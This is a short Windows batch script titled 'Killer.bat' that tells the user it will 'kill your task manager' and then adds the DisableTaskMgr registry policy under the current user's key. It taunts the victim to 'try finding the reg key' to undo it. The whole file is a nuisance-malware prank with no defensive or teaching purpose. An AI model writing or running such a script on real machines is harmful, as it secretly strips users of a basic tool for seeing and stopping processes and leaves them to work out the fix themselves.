echo off
title C:/Users/User/Desktop/Killer.bat
echo Ima kill your task manager...
echo So your task manager will be removed but if you want it back then try finding the reg key hehe
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
echo "Done!"
title Setup Finished
pause
